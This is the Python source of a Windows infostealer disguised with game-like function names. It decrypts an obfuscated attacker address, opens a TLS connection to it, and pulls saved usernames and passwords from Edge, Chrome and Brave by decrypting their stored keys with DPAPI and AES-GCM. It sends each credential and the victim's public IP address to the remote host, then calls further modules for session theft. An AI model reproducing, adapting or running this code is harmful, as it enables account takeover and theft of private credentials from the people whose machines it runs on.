import base64
import secrets
import shutil
import sqlite3
import json
import subprocess
import tempfile
import time
import win32crypt
from Crypto.Cipher import AES
from CryptoPhenix import decrypt, encrypt, gen_256
import socket
import requests
import ssl
import warnings
import certs
import os
import get_points
connect = False
import getSesions #warnings.filterwarnings("ignore", category=DeprecationWarning)

#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#

def know_gme():
    unkown = b'\x1fZ\x13t\x03\xabNf\xa7\xa0Pw\xccts\x88?3\x84,\xc4`\\\x9fj\x15\x0b\x99H)\xeb\x93\x05*\xa2-\x8f\xdd\x05&\x90\xdc\xfb\t\xc2P\xfc\xd5\x04\xbdOuX<\xfb\xb0\xc2\n\xec\xc3\x8f\x7f\x85\x03'
    return str(decrypt(unkown).decode())
    #return "127.0.0.1"



try:
    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_crte().encode())
    cock.close()

    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_locker().encode())
    csd.close()


    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile=cock.name, keyfile=csd.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5002))
    sec = context.wrap_socket(sock, server_hostname=know_gme())
    connect = True
except Exception as e:
    pass


def cmlpt_gme(locale):
    filename = os.path.join(os.environ['TEMP'], 'tem2X02.tmp')
    shutil.copyfile(locale, filename)
    with open(filename, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    mstr = base64.b64decode(local_state["os_crypt"]['encrypted_key'])

    mstr = mstr[5:]
    return win32crypt.CryptUnprotectData(mstr, None, None, None, 0)[1]


def fnlz_gme(psw, key):
    try:
        vi = psw[3:15]
        psw = psw[15:]
        chpr = AES.new(key, AES.MODE_GCM, vi)
        return chpr.decrypt(psw[:-16]).decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(psw, None, None, None, 0)[1])
        except Exception:
            return ""


def save(username, value, origin_url, date_created):
    try:
        sec.send("\n\n".encode())
        sec.send("-".encode() * 50)
        sec.send("\n".encode())
        sec.send(f"Original URL: \t{origin_url}".encode())
        sec.send("\n".encode())
        sec.send("-".encode() * 50)
        sec.send("\n".encode())
        sec.send(f"Created Time: \t{date_created}".encode())
        sec.send("\n".encode())
        sec.send("-".encode() * 50)
        sec.send("\n".encode())
        sec.send(f"Username: \t{username}".encode())
        sec.send("\n".encode())
        sec.send("-".encode() * 50)
        sec.send("\n".encode())
        sec.send(f"Password: \t{value}".encode())
        sec.send("\n".encode())
        sec.send("-".encode() * 50 + "\n".encode())

    except Exception:
        pass


def init_game(locat_e, locat_g, locat_b, ede, gle, brve):
    if connect:
        pim = b"\xa3\x92b\xdc\xab\xc2\xfc@\xd5\x94=\xa6:\x11\x9f\x13\x19\x08vS)\xa3\x04\xf4\x08&\x06L\x08|R\xe5<\xc9\x8e\t\xb5;\x99sNE\xb5P\x1b\x11\xaf'p\xf5\x87\xa5^\xa9\x90\x17_{\x94\x0f&l\xa6p\xe3'\x1e9\xf9q+\xc8\xab\x8fD\r\xe9EJ\xd5"
        sec.send("\n\n".encode() + decrypt(pim) + " ".encode())
        sec.send(requests.get('http://checkip.amazonaws.com').text.strip().encode() + "\n\n".encode())

        def edge():
            sec.send(f"\n\n\t\t[*] EDGE CRED\n".encode())
            key = cmlpt_gme(locat_e)

            fnilam = os.path.join(os.environ['TEMP'], 'tem5B46.tmp')
            cmd = f'copy "{ede}" "{fnilam}" >nul 2>&1 '
            os.system(cmd)
            pwr = sqlite3.connect(fnilam)
            drct = pwr.cursor()
            drct.execute(
                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')

            for row in drct.fetchall():
                origin_url = row[0]
                # action_url = row[1]
                username = row[2]
                value = fnlz_gme(row[3], key)
                date_created = row[4]
                # date_last_used = row[5]

                save(username, value, origin_url, date_created)

            encrypt(fnilam.encode(), secrets.token_bytes(32))

        def google():
            sec.send(f"\n\n\t\t[*] GOOGLE CRED\n".encode())

            key = cmlpt_gme(locat_g)

            fnilam = os.path.join(os.environ['TEMP'], 'tem5B52.tmp')

            cmd = f'copy "{gle}" "{fnilam}" >nul 2>&1 '
            os.system(cmd)
            pwr = sqlite3.connect(fnilam)
            drct = pwr.cursor()
            drct.execute(
                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')

            for row in drct.fetchall():
                origin_url = row[0]
                # action_url = row[1]
                username = row[2]
                value = fnlz_gme(row[3], key)
                date_created = row[4]
                # date_last_used = row[5]

                save(username, value, origin_url, date_created)
            encrypt(fnilam.encode(), secrets.token_bytes(32))

        def brave():
            sec.send("\n\n\t\t[*] BRAVE CRED\n".encode())

            key = cmlpt_gme(locat_b)

            fnilam = os.path.join(os.environ['TEMP'], 'tem2B82.tmp')
            cmd = f'copy "{brve}" "{fnilam}" >nul 2>&1 '
            os.system(cmd)
            pwr = sqlite3.connect(fnilam)
            drct = pwr.cursor()
            drct.execute(
                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
            for row in drct.fetchall():
                origin_url = row[0]
                # action_url = row[1]
                username = row[2]
                value = fnlz_gme(row[3], key)
                date_created = row[4]
                # date_last_used = row[5]

                save(username, value, origin_url, date_created)
            encrypt(fnilam.encode(), secrets.token_bytes(32))

        try:
            edge()
        except FileNotFoundError:
            sec.send("\n\n\t[!] Edge not found".encode())
        except PermissionError:
            sec.send("\n\n\t[!] We can't acces to Edge...".encode())
        try:
            google()
        except FileNotFoundError:
            sec.send("\n\n\t[!] Chrome not found".encode())
        try:
            brave()
        except FileNotFoundError:
            sec.send('\n\n\t[!] Brave not found'.encode())

        os.unlink(csd.name)
        os.unlink(cock.name)


def main():
    locat_e = os.path.join(os.environ['USERPROFILE'], "AppData", "Local",
                           "Microsoft", "Edge", "User Data", "Local State")

    locat_g = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome",
                           "User Data", "Local State")

    locat_b = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware",
                           "Brave-Browser", "User Data", "Local State")

    ede = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft",
                       "Edge", "User Data", "Default", "Login Data")

    gle = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google",
                       "Chrome", "User Data", "Default", "Login Data")

    brve = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data",
                        "Default", "Login Data")


    init_game(locat_e, locat_g, locat_b, ede, gle, brve)

    try:
        get_points.main(sec)
        getSesions.main(sec)
    except Exception:
        pass


if __name__ == "__main__":
    main()

